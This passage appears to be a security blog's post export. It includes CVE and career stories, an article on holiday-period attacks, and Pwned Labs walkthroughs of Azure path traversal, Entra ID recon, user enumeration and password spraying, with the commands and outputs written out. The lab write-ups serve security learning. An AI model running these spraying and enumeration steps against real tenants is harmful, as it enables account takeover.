tactics to craft emails and websites that look all too real, hoping you\u0026rsquo;ll bite. In this post, we\u0026rsquo;re going to break down the phishing process from the initial bait to the final hook. You\u0026rsquo;ll learn how these attacks are set up, how to spot them, and what you can do to protect yourself.","title":"Bait, Hook, and Hack"},{"content":"WayBack Three months ago, smack in the middle of my first semester university exams, I found myself pondering a big question: \u0026ldquo;What minor skill can I pick up to keep my hacking chops sharp?\u0026rdquo; Something that would make me feel like a \u0026ldquo;hecker\u0026rdquo; and not just another stressed-out student.\nAnd then, a light bulb moment! 💡 CVEs! I dove headfirst into the wonderful (and sometimes daunting) world of CVEs. I came across three fantastic resources that became my road map to success:\n8 CVEs in 2 Weeks is Crazy – Spoiler: it really is. Tips on Getting Your First CVE – Trust me, this was pure gold! Found a CVE? How to Report – Because finding is one thing, but reporting is a whole different ball game. The Hunt Begins Armed with new knowledge and a thirst for exploits, I decided to go big or go home. I started poking around open-source platforms like GitHub, using some good old-fashioned Google dorks like:\ninurl:\u0026#34;/docs/\u0026#34; \u0026#34;powered by PHP\u0026#34; OR \u0026#34;PHP CMS\u0026#34; I aimed my sights at CMS platforms, focusing primarily on the PHP, Apache2, and MySQL stack. And then, jackpot! 🎰 I hit on a CMS called Mozilo, a popular German CMS. Hecker Mode: Activated!\nThe Workflow of a Hecker So, what did my journey look like from finding the vulnerabilities to getting them published? Let me break it down:\nVulnerability Discovery: After digging around in Mozilo, I found some vulnerabilities that made me raise an eyebrow (or two). Vendor Notification: I immediately reported the vulnerability to the Mozilo team on Aug 19, 2024, at 11:59 AM. To MITRE We Go!: With no vendor response, I submitted the vulnerabilities to MITRE on Aug 19, 2:37 PM, marking the vendor confirmation as “No.” The Waiting Game: The status was set to \u0026ldquo;Reserved\u0026rdquo; on Sep 5, 2:39 PM. Let\u0026rsquo;s Publish!: I sent a publication request to MITRE on Sep 6, 5:19 PM. Patience is a virtue… but I was getting impatient! Success!: Finally, on Sep 10, 5:38 PM, the CVEs were published! 🎉 So… Am I a Hecker Yet? 🤔 I\u0026rsquo;ve been asking myself this question a lot lately. I mean, I’ve got two fresh CVEs to my name, and they’re not just any CVEs – we’re talking Authenticated Remote Code Execution (CVE-2024-44871) and Authenticated Cross-Site Scripting (CVE-2024-44872). You can check them out here if you’re curious:\nCVE-2024-44871 CVE-2024-44872 So, according to the cyber security community, I\u0026rsquo;m starting to make a name for myself. But if you ask my family? Oh, boy. 😅\nYou’d think two CVEs would be enough to prove my “hecker” credentials. Yet, my family still doesn\u0026rsquo;t get it. My mom’s idea of my hacking career? She thinks it\u0026rsquo;s all about recovering her friend’s hacked WhatsApp account.\nMom: \u0026#34;Olaoluwa, can you help recover my friend\u0026#39;s WhatsApp? It\u0026#39;s been hacked!\u0026#34; Me: \u0026#34;Mom, I just found a remote code execution vulnerability in a popular CMS.\u0026#34; Mom: \u0026#34;So… can you get her WhatsApp back or not?\u0026#34; Honestly, I don’t even know where to start with that. 😂 I try explaining that I find vulnerabilities in software, not people’s social media, but to her, all hackers are the same. In her eyes, I’m still a long way from being a \u0026ldquo;real hecker.\u0026rdquo;\nThe Support (or Lack Thereof) Despite the hilarious misunderstanding, my family\u0026rsquo;s support has been unwavering, even if they don\u0026rsquo;t fully understand what I do. From asking me if I’m going to be the next James Bond to warning me about \u0026ldquo;getting caught by the FBI,\u0026rdquo; they\u0026rsquo;ve been there for all my highs and lows. And, hey, at least they\u0026rsquo;re interested in my “hecking,” even if they think it involves more cloak-and-dagger than code and dorks.\nHow Far We\u0026rsquo;ve Come These past few months have been a rollercoaster – from long nights hunting for vulnerabilities to navigating the CVE reporting process. And even though my family doesn’t quite see the gravity of my work, I’ve met some amazing people who do. The cybersecurity community has been incredibly welcoming.\nNew opportunities and connections are coming up all the time, and I’m getting to work on projects that genuinely excite me. Every day is a new adventure – even if it does involve explaining (for the hundredth time) that I can’t actually help anyone recover a hacked Facebook account.\nBut hey, maybe one day I’ll be able to say, “Yes, mom, I’m a real hecker.” Until then, I’ll keep doing what I love, one vulnerability at a time.\nAnd who knows? Maybe next time I’ll find something even bigger… or figure out how to recover that WhatsApp account. 🙃\n","permalink":"http://localhost:1313/hacking/are_you_a_hacker/","summary":"WayBack Three months ago, smack in the middle of my first semester university exams, I found myself pondering a big question: \u0026ldquo;What minor skill can I pick up to keep my hacking chops sharp?\u0026rdquo; Something that would make me feel like a \u0026ldquo;hecker\u0026rdquo; and not just another stressed-out student.\nAnd then, a light bulb moment! 💡 CVEs! I dove headfirst into the wonderful (and sometimes daunting) world of CVEs. I came across three fantastic resources that became my road map to success:","title":"Am I a hecker yet 🤔? CVE-2024-44871 and CVE-2024-44872!"},{"content":"Fear \u0026amp; Uncertainty I remember a conversation I had with a friend last year about fear and uncertainty. His response stuck with me both humorous and profound;\nAt the time, we were both chasing similar dreams: landing the perfect job, securing the OSCP voucher, and ultimately gaining financial independence. We were filled with anticipation, unsure of what the future held but hopeful for what was to come.\nFast forward to today, and while life isn’t perfect, it has been a steady journey forward, a coastal ride with its ups and downs. Looking back, this is where the story truly began;\nSun\u0026rsquo;s Gon\u0026rsquo; Shine On Everything You Do From January to August last year, life was intense but fulfilling. I was locked in, fully focused on conquering the Certified Red Team Professional (CRTP) and Certified Penetration Testing Specialist (CPTS) which I did, though the CPTS took me two tries. That second attempt, however, was a lesson in resilience. It reinforced something important: I had been investing my time in what truly mattered my skills.\nBut after the certs, reality hit hard. I needed a new job. Not just for the money, but because my current one was taking a toll on me mentally. I wanted to quit so badly, but life has a way of keeping you enrolled in its toughest lessons especially when you\u0026rsquo;re drowning in uncertainty.\nAs much as I tried to stay afloat, the weight of it all was draining. Depression lurked around the edges, and my escape became late night hacking marathons. Picture this: loud music blaring, endless boxes to solve, energy drinks stacking up like trophies, and me reminding God very loudly, might I add that He really needed to open a door soon.\nBut if there\u0026rsquo;s one thing I’ve learned, it\u0026rsquo;s that pressure refines us. As Friedrich Nietzsche once said:\n\u0026ldquo;He who has a why to live can bear almost any how.\u0026rdquo;\nAnd so, with every sleepless night, every setback, and every moment of doubt, I kept going. Because the fire within was greater than the fear I had ahead.\nFinding Purpose in the Chaos At some point, I knew I had to shift my focus. So, I picked up a side project to sharpen my DAST and SAST skills, partly to distract myself, but also to grow. That decision led to something bigger than I expected: four CVEs under my belt;\nCVE-2024-44871 CVE-2024-44872 CVE-2024-55341 CVE-2024-55342 For the first time in a while, I felt like I was doing something great again. The momentum was back, and hacking felt alive. I could see the shift, I wasn\u0026rsquo;t just aimlessly pushing forward; I truly understood what I was doing and where I was heading.\nThat’s when I decided to challenge myself further. Azure AD hacking became my next target, thanks to my friend Hac, who believed in me enough to gift me a pwned lab voucher. That moment meant a lot. Sometimes, all it takes is someone believing in you to remind you that you’re on the right path.\nAnd through it all, my family was there. My mum, always making sure I wasn’t wrecking my health. My brother, never letting me spiral into my thoughts, always throwing in random distractions because sometimes, life isn’t that deep. Sometimes, the little things, the people who stand by you, the laughter, the random conversations are what truly matter.\nWhen Preparation Meets Opportunity Fast forward to November, and life had taken a turn. I landed three offers and accepted two, one contract-based and the other full-time. This is life. It’s unpredictable, surreal at times, and yet, somehow, things fall into place.\nBut despite the wins, a part of me still felt like I wasn’t working hard enough. Crazy, right? The same mind that once feared stagnation now questioned if it deserved the success. But that’s the thing about growth, it doesn’t always feel like progress until you stop to reflect.\nAt some point, I realized that life moves in phases. Opportunities don’t always come when you want them, but when the universe decides you’re ready. It’s a shift in perspective, a reminder that all you can do is stay prepared for when your moment arrives.\nReminds me of these bars from Roddy Ricch – \u0026ldquo;Lonely Road\u0026rdquo;:\nThe Universe Always Finds Its Timing Life has been a little fairer lately. I can finally afford my basic needs again and even help others when I can. It’s been a wild ride, and I know I owe myself a reward soon.\nThen came 12/12/2024. Right on that date, the email for the OSCP voucher landed in my inbox. Everything we worked for, the late nights, the grind, the sacrifices had finally paid off. It felt surreal, like the universe had been listening all along, waiting for the right moment to answer.\nThis wasn’t just about me. This was for the one person who had been in the trenches with me grinding, failing, pushing forward through blood, sweat, and tears. And now, here we are. No homo but i heart you Rami and I pray we get to where we really picture ourselves soon\nWhy I Can\u0026rsquo;t Be Everyone This Isn\u0026rsquo;t Exactly a FAQ\u0026hellip; Or Maybe It Is\nWhy don\u0026rsquo;t you start bug bounty? During the struggles, I got a lot of advice about starting bug bounty, but I had already been there. Trust me, I wasn’t ready for the duplicates/N\\A frustration. Hopefully, I can dive into bug bounty again maybe under Web3, but right now, there are more important things to focus on. Setting priorities for each and every goal, is the deal for now.\nAny advice for someone going through the same struggles? Here’s a piece of advice a mentor once gave me that truly worked:\nClosing Phase\u0026hellip;.Nothing More 🤷‍♂️ Life moves in phases; some uncertain, some rewarding, and some that test your patience beyond measure. But through it all, one thing remains true: growth happens in the trenches.\nEvery late night, every moment of doubt, and every step forward, no matter how small, adds up. Keep pushing, keep learning, and trust that your time will come. The universe always rewards preparation, sometimes later than expected, but always right on time.\nAnd with that, the grind continues… 🚀\n","permalink":"http://localhost:1313/hacking/time_races_ahead_before_you_blink/","summary":"Fear \u0026amp; Uncertainty I remember a conversation I had with a friend last year about fear and uncertainty. His response stuck with me both humorous and profound;\nAt the time, we were both chasing similar dreams: landing the perfect job, securing the OSCP voucher, and ultimately gaining financial independence. We were filled with anticipation, unsure of what the future held but hopeful for what was to come.\nFast forward to today, and while life isn’t perfect, it has been a steady journey forward, a coastal ride with its ups and downs.","title":"Time Races Ahead Before You Blink"},{"content":"Overview During holiday periods, alot of companies scale down operations, whereas employees take time off work and most of all security teams operate with minimal staff. Threat Actors/Advanced Persistent Threats (APTs) use this as an avenue to launch cyberattacks as there are reduction in vigilance making this a prime window to carry out attacks like ransomeware, DDOS, Phishing and many other sophisticated cyber attacks. Here are few common tactics used by adversaries during holidays and recommendations to mitigate the risks.\n1. Supply Chain Attacks This attacks are also called third-party attacks which involves a threat actors using vulnerable third party tools or services to infiltrate systems or networks, leveraging these connections to access the target company. A real world example as shown in this blog, where the Attackers positioned malicious code into SolarWind\u0026rsquo;s software updates. where as when companies installed these \u0026ldquo;trusted\u0026rdquo; updates, they unknowingly let the attackers into their systems via the inserted malicious code. Another real word example is the supply chain attack in Google’s Open-Source Project, \u0026ldquo;Flank\u0026rdquo;, This occurred when attackers gained access to the project\u0026rsquo;s GitHub repository through stolen credentials, allowing them to inject malicious code into a legitimate update, which was then unknowingly distributed to users, potentially compromising systems that integrated the tampered software, More information about this can be found in the following blog also, including another X post from \u0026lsquo;StepSecurity\u0026rsquo; showing a more precise way of how this was carried out.\nStepSecurity Harden-Runner detected a supply chain attack on a Google open-source project in real time!https://t.co/51pVO9J7sX\n\u0026mdash; StepSecurity (@step_security) April 15, 2024 2. Phishing Campaigns This are popularly known as email scams which are used to steal Personally identifiable information (PII) from victims, Information such as credit card details, transfer funds, third party login details etc could be compromised, Most times the urgency or generosity of staffs/employees might be leveraged to trick them into clicking malicious links or revealing sensitive information. Below is an example of how a phishing email is crafted as shown in the image below :\n19 Phishing email examples. (n.d.). https://www.terranovasecurity.com/blog/top-examples-of-phishing-emails\n3. Exploitation of Reduced Monitoring There are several attacks caused due to this like ransomeware and Distributed Denial Of Service (DDOS) attacks, Infact according to Semperis\u0026rsquo;\u0026ldquo;2024 Ransomware Holiday Risk Report\u0026rdquo;, 86 percent of organizations surveyed in the U.S., UK, France and Germany, are targeted by ransomware on a holiday or weekend and the most reason is due to the fact that companies/organizations are under staffed during this period leading to fallout in systems due to data breaches. An example is the Los Angeles Unified School District ransomeware attack which occurred over Labor Day weekend which was launched by a Russian-speaking ransomware gang known as VIce Society. This was confimred according to a tweet made by the \u0026ldquo;* Los Angeles Unified*\u0026rdquo; official account on September 6, 2022.\nLos Angeles Unified Targeted by Ransomware Attack\nFor more information, please visit https://t.co/Dh4YtLJVxY. pic.twitter.com/Kb8E0HRFWq\n\u0026mdash; Los Angeles Unified (@LASchools) September 6, 2022 4. Exploitation of Delayed Patch Management During holidays, IT teams may delay routine updates and patches, leaving systems vulnerable to available known exploits/Common Vulnerabilities and Exposures (CVEs). Threat actors might capitalize on this gap where as launching attacks on unpatched systems, often leveraging automated scanning tools like shodan, whcih is a search engine for Internet-connected devices, to find entry points.\nBelow is a shodan query to discover Apache HTTP servers targetting a specific version known to have a critical vulnerability for example CVE-2021-41773, which allows path traversal and remote code execution.\nproduct:\u0026#34;Apache httpd\u0026#34; version:\u0026#34;2.4.49\u0026#34; Mitigation Strategies Haven\u0026rsquo;t covered all of this, there are still alot of attacks threat actors use to compromise companies during holiday periods, as the list is extensive, Now let look into the mitigation strategies to avoid the ones we have talked about :\n1. Proactive Monitoring : With the use of automated threat detetion and response systems in place, attacks like the supply chain attack could be avoided to fill gaps during reduced staffing.\n2. Employee Training : It is important for organizations to conduct holiday themed phishing simulations and trainings to raise awareness about seasonal scams.\n3. Incident Response Plans : A proper inident response lifecycle with contigency plans like detection and analysis, containment, eradication, recovery and post-incident activities for rapid response should be in place during holiday periods including on call staff rotations.\n4. Zero-Trust Policies : It is likewise important to limit access to sensitive systems and implement strict identity verification, especially for temporary or remote staff.\n","permalink":"http://localhost:1313/hacking/how_threat_actors_take_advantage_of_companies_on_holiday/","summary":"Overview During holiday periods, alot of companies scale down operations, whereas employees take time off work and most of all security teams operate with minimal staff. Threat Actors/Advanced Persistent Threats (APTs) use this as an avenue to launch cyberattacks as there are reduction in vigilance making this a prime window to carry out attacks like ransomeware, DDOS, Phishing and many other sophisticated cyber attacks. Here are few common tactics used by adversaries during holidays and recommendations to mitigate the risks.","title":"How threat actors take advantage of companies on holiday"},{"content":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nLab Link : https://pwnedlabs.io/labs/bypass-azure-web-app-authentication-with-path-traversal\nOverview -\u0026gt; On an engagement for our client Mega Big Tech, we used a custom phishlet and successfully performed an Evilginx man-in-the-middle attack to gain valid company credentials. You are tasked with demonstrating the impact of the breach and gaining access to business critical information.\nFor this lab we have been given credentials to start with ;\nPassword: ********** Username: annette.palmer@megabigtech.com We can go ahead and use the below command to authenticate to Az Services for further enumeration\nConnect-AzAccount We can check the resources our current user has access to by using the below command\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzResource ## Output Name : megabigtech-dev ResourceGroupName : megabigtech-dev_group ResourceType : Microsoft.Web/sites Location : eastus ResourceId : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/megabigtech-dev_group/providers/Microsoft.Web/sites/megabigtech-dev Tags : We have got access to the resource group named megabigtech-dev_group, which serves an Azure Web App. We can go ahead and get the enabled host names.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; (Get-AzWebApp -ResourceGroupName \u0026#34;megabigtech-dev_group\u0026#34; -Name \u0026#34;megabigtech-dev\u0026#34;).EnabledHostNames megabigtech-dev.azurewebsites.net megabigtech-dev.scm.azurewebsites.net According to pwnedlabs ;\nAny time an app is created, App Service creates a Kudu companion app for it that allows us to manage the app instance, including getting terminal access. The location of this app can vary depending on the configuration.\nhttps://\u0026lt;app-name\u0026gt;.scm.azurewebsites.net (if the app isn\u0026rsquo;t in an isolation tier) https://\u0026lt;app-name\u0026gt;.scm.\u0026lt;ase-name\u0026gt;.p.azurewebsites.net (if the app is internet-facing and in an isolated tier) https://\u0026lt;app-name\u0026gt;.scm.\u0026lt;ase-name\u0026gt;.appserviceenvironment.net (if the app is internal and in an isolated tier)\u0026quot; Further Explanation ;\nAccessing the kudu Az App service we have an authorization error for our present authenticated user\nHowever accessing the other host name gotten from our previous enumeration we have a functioning website\nClicking the \u0026ldquo;Status\u0026rdquo; session as shown in the above image we are referred to a URL with a parameter.\nIt is worth checking for LFI/Path Traversal vulnerabilities, Go ahead and intercept this request with burpsuite and send the request to the \u0026ldquo;Repeater\u0026rdquo; tab.\nFirstly we can confirm if we truly have a path traversal vulnerability, by changing the value of the endpoint as shown below.\nInstead of ../latest we can use the URI location ../status.aspx to see if this works and as shown below we have the following output confirm that this vulnerability exists\nSince the path in the URI worked let go ahead and fuzz for other paths, we can do this using burp also by sending the request from \u0026ldquo;Repeater\u0026rdquo; to \u0026ldquo;Intruder\u0026rdquo; and highlighting the full path including the parameter to be fuzzed\nFor the wordlist you can go ahead and use this as provided by PwnedLabs, Also go over to the \u0026ldquo;Options\u0026rdquo; tab and enable both options as shown below to avoid future errors.\nRunning the attack as shown below and filtering by \u0026ldquo;Length\u0026rdquo; we can see that we have two 403 status code prompt meaning the paths exist but we don\u0026rsquo;t have permissions to view this paths.\nSince we have a path traversal vulnerability and reading files via this way doesn\u0026rsquo;t imply whether we have permissions to read the file or not, nevertheless we can still read the file, sweet!!\nWe can go ahead and fuzz for files in the /admin endpoint, since it is the most juicy, don\u0026rsquo;t forget to append the .aspx extension as this server is an ASP.NET server as shown in the below screenshot\nOnce implemented you can go ahead and start the attack, just to understand this more, the below image should help ;\nFiltering by \u0026ldquo;Status Code\u0026rdquo; we can see that we successfully have access to the /admin/login.aspx endpoint as shown in the below screenshot\nWe can go back to the repeater tab and try to read the source code of this login file as shown below\nWe are referred to ../admin/login.aspx.cs so let go ahead and see what we have there, whereas sending the request we have hardcoded credentials ;\nWe can navigate to the login endpoint and login with the credentials we have at hand\nBe cool ⋆˚🐾˖°\n","permalink":"http://localhost:1313/hacking/bypass_azure_web_app_authentication_with_path_traversal/","summary":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nLab Link : https://pwnedlabs.io/labs/bypass-azure-web-app-authentication-with-path-traversal\nOverview -\u0026gt; On an engagement for our client Mega Big Tech, we used a custom phishlet and successfully performed an Evilginx man-in-the-middle attack to gain valid company credentials. You are tasked with demonstrating the impact of the breach and gaining access to business critical information.","title":"Bypass Azure Web App Authentication with Path Traversal"},{"content":"Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nWalkThrough A possible password leak was found on pastebin\nWe need to determine if Mega Big Tech is using Azure Entra ID to manage their identities. The domain name megabigtech.com was given and it is possible check if a particular company is using Entra ID for authentication by browsing to the URL below. https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com\u0026amp;xml=1\nWhereas replacing the ?login parameter with the domain name Then if the NameSpaceType value shows as Managed then the company is using Entra ID ; The GetUserRealm.srf path is known as a user realm discovery described by Microsoft An input is given on the Microsoft sign-in page for the username value A request is then sent to this endpoint to determine the type of account associated with that username We can then attempt to get more information about the tenant since we know the company is using Entra ID.\nThe following URL allows us to do this, by using the .well-known/openid-configuration endpoint in the context of OpenID Connect (OIDC), which is an identity layer on top of the OAuth 2.0 protocol.\nhttps://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration\nThis is a critical endpoint for -:\nClients to discover how to interact with the identity provider\u0026rsquo;s OAuth 2.0 Clients to discover how to interact with the identity provider\u0026rsquo;s OpenID Connect services As shown in the below screenshot the Tenant ID is revealed -:\nThere are also alternate ways to enumerate this for example, using tools like AADInternals\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Install-Module AADInternals PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Import-Module AADInternals ___ ___ ____ ____ __ __ / | / | / __ \\/ _/___ / /____ _________ ____ _/ /____ / /| | / /| | / / / // // __ \\/ __/ _ \\/ ___/ __ \\/ __ `/ / ___/ / ___ |/ ___ |/ /_/ _/ // / / / /_/ __/ / / / / / /_/ / (__ ) /_/ |_/_/ |_/_____/___/_/ /_/\\__/\\___/_/ /_/ /_/\\__,_/_/____/ v0.9.4 by @DrAzureAD (Nestori Syynimaa) With the below commands we can get the domain information and the Tenant ID\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AADIntLoginInformation -Domain megabigtech.com Federation Metadata Url : Cloud Instance : microsoftonline.com Account Type : Managed Federation Brand Name : Default Directory Tenant Banner Logo : State : 4 Pref Credential : 1 Cloud Instance audience urn : urn:federation:MicrosoftOnline Tenant Banner Illustration : Authentication Url : Domain Name : megabigtech.com Exists : 1 Federation Active Authentication Url : Domain Type : 3 Federation Protocol : Throttle Status : 0 Has Password : True Consumer Domain : Tenant Locale : Federation Global Version : User State : 1 Desktop Sso Enabled : PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AADIntTenantID -Domain megabigtech.com 2590ccef-687d-493b-ae8d-441cbab63a72 We can also run the next command, which looks to answer the following questions as described by PwnedLabs :\nValue Description DNS Does the DNS record exist? MX Does the MX point to Office 365? SPF Does the SPF contain Exchange Online? Type Federated or Managed DMARC Is the DMARC record configured? DKIM Is the DKIM record configured? MTA-STS Is the MTA-STS recored configured? STS The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server RPS Relaying parties of STS (AD FS). Requires -GetRelayingParties switch. Source: https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Invoke-AADIntReconAsOutsider -Domain \u0026#34;megabigtech.com\u0026#34; | Format-Table Tenant brand: Default Directory Tenant name: iancloudpwned.onmicrosoft.com Tenant id: 2590ccef-687d-493b-ae8d-441cbab63a72 Tenant region: EU DesktopSSO enabled: False Name DNS MX SPF DMARC DKIM MTA-STS Type STS ---- --- -- --- ----- ---- ------- ---- --- iancloudpwned.mail.onmicrosoft.com False False False False False Managed iancloudpwned.onmicrosoft.com False False False False False Managed international-am.com False False False False False Managed megabigtech.com False False False False False Managed We can also gather subdomains using the AzSubEnum tool, a specialized subdomain enumeration tool tailored for Azure services.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; git clone https://github.com/yuyudhn/AzSubEnum.git Cloning into \u0026#39;AzSubEnum\u0026#39;... remote: Enumerating objects: 45, done. remote: Counting objects: 100% (45/45), done. remote: Compressing objects: 100% (38/38), done. remote: Total 45 (delta 20), reused 19 (delta 6), pack-reused 0 (from 0) Receiving objects: 100% (45/45), 386.80 KiB | 235.00 KiB/s, done. Resolving deltas: 100% (20/20), done. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; cd ./AzSubEnum/ PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/AzSubEnum\u0026gt; python3 azsubenum.py -b megabigtech --thread 10 Discovered Subdomains: App Services - Management: --------------------------------------- megabigtech.scm.azurewebsites.net App Services: ----------------------------------- megabigtech.azurewebsites.net Navigating to the discovered App Services subdomain we have the below web page\nAccording to the above screenshots\nWe have some employees and their roles assigned We also have an email format ; \u0026ldquo;Kato.Sara@megabigtech.com\u0026rdquo; which could be used to create other emails also as shown below : yuki.tanaka@megabigtech.com yamamoto.sota@megabigtech.com takahashi.hina@megabigtech.com kato.sara@megabigtech.com Since we now have a username wordlist we can manually test them by going to https://login.microsoftonline.com. If a username is valid we would be prompted for a password else, a message \u0026ldquo;This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.\u0026rdquo; would be returned\nIt is possible to automate this whole process though by using a tool called Omnispray\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; git clone https://github.com/0xZDH/Omnispray Cloning into \u0026#39;Omnispray\u0026#39;... remote: Enumerating objects: 460, done. remote: Counting objects: 100% (45/45), done. remote: Compressing objects: 100% (31/31), done. remote: Total 460 (delta 27), reused 19 (delta 14), pack-reused 415 (from 1) Receiving objects: 100% (460/460), 87.13 KiB | 97.00 KiB/s, done. Resolving deltas: 100% (302/302), done. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; cd ./Omnispray/ PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray\u0026gt; nano users.txt PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray\u0026gt; python3 omnispray.py --type enum -uf users.txt --module o365_enum_office *** Omnispray *** \u0026gt;---------------------------------------\u0026lt; \u0026gt; version : 0.1.4 \u0026gt; module : o365_enum_office \u0026gt; type : enum \u0026gt; userfile : users.txt \u0026gt; count : 1 passwords/spray \u0026gt; lockout : 15.0 minutes \u0026gt; wait : 5.0 \u0026gt; timeout : 25 seconds \u0026gt; pause : 0.25 seconds \u0026gt; rate : 10 threads \u0026gt; start : 2024-10-26 15:15:52 \u0026gt;---------------------------------------\u0026lt; [2024-10-26 15:15:52,906] INFO : Generating prerequisite data via office.com... [2024-10-26 15:16:17,914] INFO : Enumerating 4 users via \u0026#39;o365_enum_office\u0026#39; module [2024-10-26 15:16:30,667] INFO : [ + ] yuki.tanaka@megabigtech.com [ - ] yamamoto.sota@megabigtech.com [2024-10-26 15:16:32,797] INFO : Results can be found in: \u0026#39;/home/sec-fortress/Az_lab/Omnispray/results/\u0026#39; [2024-10-26 15:16:32,797] INFO : Valid user accounts: 1 [2024-10-26 15:16:33,049] INFO : /home/sec-fortress/Az_lab/Omnispray/omnispray.py executed in 40.26 seconds. Since we now have a valid set of account we can go ahead and perform a credential stuffing or password spraying attack as this are definitely noisy and risk detection (and locking accounts), and so it\u0026rsquo;s often worth exploring other avenues.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; wget https://raw.githubusercontent.com/dafthack/MSOLSpray/refs/heads/master/MSOLSpray.ps1 Saving to: ‘MSOLSpray.ps1’MSOLSpray.ps1 100%[=====================================================================================================\u0026gt;] 8.52K 32.0KB/s in 0.3s 2024-10-26 15:25:51 (32.0 KB/s) - ‘MSOLSpray.ps1’ saved [8727/8727] ## Import module with dot sourcing PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; . .\\MSOLSpray.ps1 PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; echo \u0026#34;yuki.tanaka@megabigtech.com\u0026#34; \u0026gt; valid_user PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Invoke-MSOLSpray -UserList ./valid_user -Password \u0026#34;MegaDev79$\u0026#34; -Verbose [*] There are 1 total users to spray. [*] Now spraying Microsoft Online. [*] Current date and time: 10/26/2024 15:27:00 VERBOSE: POST with 195-byte payload VERBOSE: received 3677-byte response of content type application/json [*] SUCCESS! yuki.tanaka@megabigtech.com : MegaDev79$ \u0026ldquo;Note: very often we wouldn’t be able to just log directly into a tenant over the Internet as MFA is getting more common place. Other guided labs from Pwned Labs where explored on how to check if MFA is enabled for gaps and to gain access.\u0026rdquo; \u0026ndash; PwnedLabs\nWe can then attempt to gather as much information as possible with our credentialed access using the Az Powershell and Microsoft Graph PowerShell SDK modules\nConnect-AzAccount Connect-MgGraph To Enumerate all users in the tenant we can issue the following command.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzADUser Here are some few questions to ask after getting foothold with a compromised user as described by PwnedLabs:\nIs the user part of any group? If so, does this group has any role assigned to it? Does the user have any Azure Entra ID roles assigned to them? Which objects has this user created? Is this user the owner of any service principal? We can go ahead and query individual properties a using the Az PowerShell module which could help in mapping out possible responsibilities and relationships within the company.\nGet-AzADUser -UserPrincipalName \u0026#39;yuki.tanaka@megabigtech.com\u0026#39; | fl Using the below command we could also check if there are resources owned by our current user (None Unfortunately) .\nGet-MgUserOwnedObject -UserId \u0026#34;yuki.tanaka@megabigtech.com\u0026#34; We could also check if our present user is a member of any groups by looping through all groups with the below script.\n$userId = \u0026#34;yuki.tanaka@megabigtech.com\u0026#34; $groupIds = (Get-MgUserMemberOf -UserId $userId).Id $groupNames = @() foreach ($groupId in $groupIds) { $group = Get-MgGroup -GroupId $groupId $groupNames += $group.DisplayName } $groupNames No interesting data or role where discovered in this tenant, We can switch to the Azure Subscription and enumerate which RBAC roles this user has.\nRetrieve the current authentication context for Azure Resource Manager requests PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzContext Tenant: Default Directory (2590ccef-687d-493b-ae8d-441cbab63a72) SubscriptionName SubscriptionId Account Environment ---------------- -------------- ------- ----------- Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 yuki.tanaka@megabigtech.com AzureCloud The Get-AzContext -ListAvailable cmdlet returns all available, previously logged in contexts\nIf a user hasn\u0026rsquo;t executed the Disconnect-AzAccount command The session\u0026rsquo;s context remains active! In which the Select-AzContext command could be used to impersonate the session. See Blog1, Blog2 and Blog3 to understand more. Enumerate subscriptions that are accessible/available to the current user PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzSubscription TenantId: 2590ccef-687d-493b-ae8d-441cbab63a72 Name Id State ---- -- ----- Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 Enabled Food For Thoughts :\nSo, many subscriptions can share one tenant, but each subscription is “loyal” to just one tenant.\nThe below command will return the resources for which the user has at least the Reader role in Role-Based Access Control (RBAC)\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; Get-AzResource Name : megabigtechdevapp23 ResourceGroupName : mbt-rg-3 ResourceType : Microsoft.Web/sites Location : eastus ResourceId : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23 Tags : We can check what RBAC permissions we have over this Web App by running the following cmdlet\nGet-AzRoleAssignment -SignInName \u0026lt;User-Email\u0026gt; Break Down :\nUser has the Website Contributor role on an Azure App Service. This role includes access to the Kudu console, a tool for debugging and monitoring Azure Web Apps. The Kudu console provides 